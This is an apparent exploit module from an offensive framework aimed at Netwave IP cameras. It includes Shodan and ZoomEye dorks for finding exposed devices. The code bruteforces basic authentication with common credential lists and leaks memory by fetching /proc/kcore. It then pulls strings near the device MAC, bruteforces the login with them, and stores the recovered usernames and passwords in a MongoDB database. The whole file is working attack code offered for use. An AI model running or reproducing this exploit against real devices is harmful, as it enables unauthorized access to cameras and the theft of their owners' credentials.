# Mandatory imports
from framework.validator.validator import Validator
import framework.validator.validators as V
import utils.print_utils as print_utils
from framework.modules.module_common import Description
from assets.asset_manager import AssetManager
# Mandatory imports End

# Submodules imports
import framework.modules.generic.submodules.strings as strings
from framework.modules.generic.submodules.http_bruteforce import HTTPBruteforce
from framework.modules.generic.submodules.http_discovery import HTTPStatusCodeDiscovery
# Submodules imports End

# Database
from database.MongoDB import MongoDB
# Database End

# Category specific imports
from . import netwave_get_mac
# Category specific imports End

import hashlib
import time
import os
import requests
import re


class ModuleDatabase(MongoDB):
    def __init__(self):
        super(ModuleDatabase, self).__init__()

    def insert_dump(self, **kwargs):
        fields = ["ipport", "dump"]
        return self._insert_one(self.db.netwave_kcore_dump, fields, **kwargs)

    def insert_camera_credentials(self, **kwargs):
        fields = ["ipport", "user", "pwd"]
        return self._insert_one(self.db.camera_credentials, fields, **kwargs)

    def is_camera_in_credentials(self, ipport):
        ret = self._count_documents(self.db.camera_credentials, {
            "ipport": ipport
        })
        return True if ret != 0 else False


class Module():
    __info__ = {
            "name": "Netwave kcore dump",
            "tags": ["camera"],
            "type": "exploit/Password disclosure",
            "edb-id": "41236",
            "description": "Netwave Camera Memory leak",
            "additional_comments": [],
            "authors": ["SPIRITNULL"],
            "dorks": [
                'shodan:"Server: Netwave IP Camera"',
                'zoomeye:"Netwave IP camera http config"'
            ]
        }

    def __init__(self):
        self.init()
        self.db = ModuleDatabase()
        self.add_option(
            "targets",
            opt_default_value=["127.0.0.1:8080"],
            opt_validators=[V.vld_ipv4_with_port],
            opt_type=str,
            opt_is_list=True,
            mandatory=True,
            help="List of targets"
        )
        self.add_option(
            "ssl",
            opt_default_value=False,
            opt_validators=[],
            opt_type=bool,
            opt_is_list=False,
            mandatory=False,
            help="SSL"
        )
        self.add_option(
            "brute",
            opt_default_value=True,
            opt_validators=[],
            opt_type=bool,
            opt_is_list=False,
            mandatory=False,
            help="Soft bruteforce before running main exploit"
        )
        self.add_option(
            "brute-only",
            opt_default_value=False,
            opt_validators=[],
            opt_type=bool,
            opt_is_list=False,
            mandatory=False,
            help="Soft bruteforce only"
        )

    # Run module
    def run(self):
        if not self.validate():
            print_utils.time_print("Module run stopped")
            return False
        # init variables
        targets, ssl = self.opt_val("targets"), self.opt_val("ssl")

        protocol = "https" if ssl else "http"
        pool = [(
            "%s://%s/get_status.cgi" % (protocol, target),
            "%s://%s//proc/kcore" % (protocol, target),
            "%s://%s/check_user.cgi" % (protocol, target),
            "%s" % (target),
        ) for target in targets]
        location = 10100
        sleeping = 20

        for P in pool:
            dump_results = []
            print("[>] Target:", P[3])
            string_len = 0
            # Step -1: skip if in db
            if self.db.is_camera_in_credentials(P[3]) is True:
                print("[*] Target already in database (skipping)")
                continue
            # Step 0: soft bruteforce
            if self.opt_val("brute") or self.opt_val("brute-only"):
                ip, port = P[3].split(":")
                http_discovery = HTTPStatusCodeDiscovery(ip, port)
                endpoints = http_discovery.discover(["check_user.cgi"], 401)
                if endpoints != []:
                    brute_url = endpoints[0]["url"]
                    print("Trying to bruteforce:", brute_url)
                    soft_brute = HTTPBruteforce()
                    usernames = AssetManager(
                        ["bruteforce", "easy_usernames.txt"])
                    passwords = AssetManager(
                        ["bruteforce", "easy_passwords.txt"])
                    results = soft_brute.http_basic_auth_bruteforce(
                        brute_url, usernames.lines(),
                        passwords.lines(), verbose=True
                    )
                    for user, pwd in results:
                        self.save(ipport=P[3], user=user, pwd=pwd)
                if results != []:
                    print("[+] Bruteforce succeeded. Skipping this target.")
                    continue
                else:
                    if self.opt_val("brute-only"):
                        continue
                    print("[*] Bruteforce failed. Sleeping 10s to recover.")
                    time.sleep(10)
            # Step 1 : Get MAC
            try:
                self.MAC = netwave_get_mac(P[0])
                print("Got MAC: %s" % str(self.MAC, "utf8"))
            except Exception as e:
                print("Got MAC exception:", e)
                continue
            # Step 2 : Dump
            try:
                req = requests.get(P[1], stream=True, timeout=7)
                print("Status code:", req.status_code)
                print("Vulnarable:",
                      "Yes" if req.status_code == 200 else "No")

                for chunk in req.iter_content(chunk_size=8192):
                    lst, _ = strings.regex_strings(chunk)
                    string_len += _
                    print("\rProgress: %.2f%%\t" % ((string_len/location)*100),
                          end="")
                    if self.MAC in lst:
                        print("\n[+] Found location")
                        dump_results = lst
                        self.db.insert_dump(
                            ipport=P[3],
                            dump=b":::".join(dump_results)
                        )
                        break

                # Step 3 : Bruteforce
                if dump_results != []:
                    del req
                    print("\nSleeping: %ss" % sleeping)
                    time.sleep(sleeping)
                    brute = HTTPBruteforce()
                    creds = list(set(dump_results))
                    results = brute.http_basic_auth_bruteforce(
                        P[2], creds, creds, verbose=True
                    )
                    for user, pwd in results:
                        self.save(ipport=P[3], user=user, pwd=pwd)
            except Exception as e:
                print("Dump exception: ", e)
                continue

    # Save results to database
    def save(self, **kwargs):
        self.db.insert_camera_credentials(**kwargs)

    # Check if target is vulnerable
    def is_vuln(self, **kwargs):
        return None, "<not_implemented>"
